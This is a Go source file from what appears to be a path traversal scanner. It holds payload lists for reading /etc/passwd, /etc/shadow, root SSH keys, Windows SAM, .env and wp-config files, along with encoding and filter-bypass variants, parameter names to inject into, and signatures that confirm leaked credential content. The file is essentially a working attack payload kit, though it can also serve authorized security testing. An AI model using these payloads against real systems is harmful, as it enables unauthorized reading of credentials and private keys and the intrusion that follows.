package pathtraversal

import (
	"fmt"
	"strings"
)

// PayloadSet contains payload templates for different target types
type PayloadSet struct {
	Name     string
	Payloads []string
}

// GetPayloads returns the default payload sets
func GetPayloads() []PayloadSet {
	return []PayloadSet{
		{
			Name: "Unix/Linux Paths",
			Payloads: []string{
				// Basic traversal
				"../../../../../../../etc/passwd",
				"../../../../../../../etc/shadow",
				"../../../../../../../etc/hosts",
				"../../../../../../../etc/hostname",
				"../../../../../../../proc/version",
				"../../../../../../../proc/self/environ",
				"../../../../../../../root/.ssh/id_rsa",
				"../../../../../../../home/*/.*",
				"../../../../../../../var/www/html/config.php",
				"../../../../../../../usr/local/etc/nginx/nginx.conf",

				// With null byte (older PHP)
				"../../../../../../../etc/passwd%00",

				// With extension append
				"../../../../../../../etc/passwd.txt",
				"../../../../../../../etc/passwd.php",

				// Double slash
				"....//....//....//....//etc/passwd",
				"....//../../../etc/passwd",

				// Backslash variants
				"..\\..\\..\\..\\..\\etc\\passwd",
			},
		},
		{
			Name: "Windows Paths",
			Payloads: []string{
				// Windows system files
				"..\\..\\..\\..\\windows\\win.ini",
				"..\\..\\..\\..\\windows\\system32\\config\\sam",
				"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
				"..\\..\\..\\..\\boot.ini",
				"../../../windows/win.ini",
				"../../../windows/system32/config/sam",

				// Windows paths with forward slash
				"../../../../windows/win.ini",
				"../../../../windows/system32/drivers/etc/hosts",
				"../../../../programfiles/apache/conf/httpd.conf",
			},
		},
		{
			Name: "Web Application Config Files",
			Payloads: []string{
				// PHP/Apache
				"../../../.env",
				"../../../.env.local",
				"../../../.htaccess",
				"../../../config.php",
				"../../../wp-config.php",
				"../../../configuration.php",
				"../../../settings.php",
				"../../../database.yml",
				"../../../database.php",

				// Laravel
				"../../../.env",
				"../../../config/database.php",

				// Django/Python
				"../../../settings.py",
				"../../../manage.py",
				"../../../requirements.txt",

				// Node.js
				"../../../.env",
				"../../../package.json",
				"../../../config.json",

				// General
				"../../../secrets.json",
				"../../../credentials.json",
				"../../../config.json",
				"../../../app.config",
				"../../../web.config",
			},
		},
		{
			Name: "URL Encoded Variants",
			Payloads: []string{
				// Single URL encoding
				"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
				"..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
				"..%2F..%2F..%2F.env",

				// Double URL encoding
				"..%252F..%252F..%252F..%252Fetc%252Fpasswd",
				"..%252F..%252F..%252F.env",

				// Mixed encoding
				"..%2f..%2f..%2fetc%2fpasswd",
				"..%5c..%5c..%5cwindows%5cwin.ini",
			},
		},
		{
			Name: "Bypass Techniques",
			Payloads: []string{
				// Case variation
				"../../../../../../../ETC/PASSWD",
				"../../../../../../../etc/PASSWD",

				// Unicode/UTF-8 tricks
				"..%252e%252f..%252e%252f..%252e%252fetc%252fpasswd",

				// Backslash variations
				"..\\..\\..\\etc\\passwd",
				"..\\\\..\\\\..\\\\etc\\\\passwd",

				// Null terminator approaches (PHP < 5.3.4)
				"../../../etc/passwd%00.txt",
				"../../../etc/passwd%00.php",

				// Dots variations
				"....//....//....//etc/passwd",
				"..\\\\..\\\\..\\\\etc\\\\passwd",

				// With parameters
				"../../../etc/passwd?",
				"../../../etc/passwd#",
				"../../../etc/passwd%23",

				// Short ASCII codes
				"..%2e%2e%2fetc%2fpasswd",

				// Long path bypass
				"../../../../../../../../../../../etc/passwd",
			},
		},
	}
}

// GenerateAllPayloads returns all payloads flattened
func GenerateAllPayloads() []string {
	var all []string
	for _, set := range GetPayloads() {
		all = append(all, set.Payloads...)
	}
	return all
}

// GenerateEncodedVariants creates encoding variants of a payload
func GenerateEncodedVariants(basePayload string) []string {
	variants := []string{
		basePayload, // Plain
	}

	// URL encode
	urlEncoded := ""
	for _, char := range basePayload {
		if (char >= 'a' && char <= 'z') || (char >= 'A' && char <= 'Z') ||
			(char >= '0' && char <= '9') || char == '-' || char == '_' ||
			char == '.' || char == '~' {
			urlEncoded += string(char)
		} else {
			urlEncoded += fmt.Sprintf("%%%02X", char)
		}
	}
	if urlEncoded != basePayload {
		variants = append(variants, urlEncoded)
	}

	// Double URL encode
	doubleEncoded := ""
	for _, char := range urlEncoded {
		if char == '%' {
			doubleEncoded += "%25"
		} else {
			doubleEncoded += string(char)
		}
	}
	if doubleEncoded != urlEncoded {
		variants = append(variants, doubleEncoded)
	}

	return variants
}

// CommonParameters returns common parameter names for path traversal testing
func CommonParameters() []string {
	return []string{
		// File/path parameters
		"file",
		"path",
		"filepath",
		"filename",
		"dir",
		"directory",
		"document",
		"page",
		"include",
		"require",
		"load",
		"fetch",
		"download",
		"upload",
		"url",
		"link",
		"redirect",

		// ID/reference parameters
		"id",
		"pid",
		"page_id",
		"post_id",
		"user_id",
		"file_id",
		"document_id",

		// Language/locale parameters
		"lang",
		"language",
		"locale",

		// Template parameters
		"template",
		"theme",
		"skin",
		"layout",

		// Action parameters
		"action",
		"do",
		"cmd",
		"command",
		"operation",

		// Config parameters
		"config",
		"setting",
		"option",
		"key",
		"value",
	}
}

// DetectFileContent detects common file signatures in response body
func DetectFileContent(body string) (detected bool, fileType string, confidence float64) {
	patterns := map[string][]string{
		"Unix Passwd": {
			"root:x:0:0:",
			"root::0:0:",
			"/bin/bash",
			"/sbin/nologin",
			"/bin/false",
			"/nologin",
		},
		"Unix Shadow": {
			"root:$1$",
			"root:$2",
			"root:$6$",
			"root:!:",
			"root:*:",
		},
		"Windows INI": {
			"[windows]",
			"[system]",
			"[boot]",
			"[drivers]",
		},
		"PHP Config": {
			"<?php",
			"$_SERVER",
			"$_ENV",
			"define(",
			"require",
			"include",
		},
		"Env File": {
			"DATABASE_URL=",
			"API_KEY=",
			"SECRET_KEY=",
			"PASSWORD=",
			"DB_PASSWORD=",
			"AWS_",
		},
		"JSON Config": {
			"\"database\"",
			"\"password\"",
			"\"api_key\"",
			"\"secret\"",
			"\"token\"",
		},
		"SSH Key": {
			"-----BEGIN RSA PRIVATE KEY-----",
			"-----BEGIN PRIVATE KEY-----",
			"-----BEGIN OPENSSH PRIVATE KEY-----",
		},
		"Apache Config": {
			"<VirtualHost",
			"<Directory",
			"DocumentRoot",
			"ServerName",
			"LoadModule",
		},
	}

	lowerBody := strings.ToLower(body)

	for fileType, signatures := range patterns {
		matches := 0
		totalSigs := len(signatures)

		for _, sig := range signatures {
			if strings.Contains(lowerBody, strings.ToLower(sig)) {
				matches++
			}
		}

		if matches > 0 {
			confidence := float64(matches) / float64(totalSigs) * 100
			if confidence > 25 { // At least 25% match
				return true, fileType, confidence
			}
		}
	}

	return false, "", 0
}
